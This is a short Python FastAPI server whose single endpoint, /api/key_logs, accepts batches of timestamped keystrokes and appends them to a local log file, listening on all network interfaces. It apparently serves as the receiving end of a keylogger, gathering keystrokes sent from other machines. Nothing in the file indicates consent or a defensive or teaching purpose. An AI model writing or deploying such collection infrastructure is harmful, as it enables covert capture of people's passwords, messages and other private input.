from fastapi import FastAPI

app = FastAPI()

@app.post("/api/key_logs")
async def receive_key_logs(logs: list):
    with open("server_key_logs.txt", "a") as f:
        for log_dict in logs:
            for timestamp in log_dict:
                for key in log_dict[timestamp]:
                    f.write(f"{timestamp}\n{key}\n")
    return {"message": "Data received"}

if __name__ == '__main__':
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)
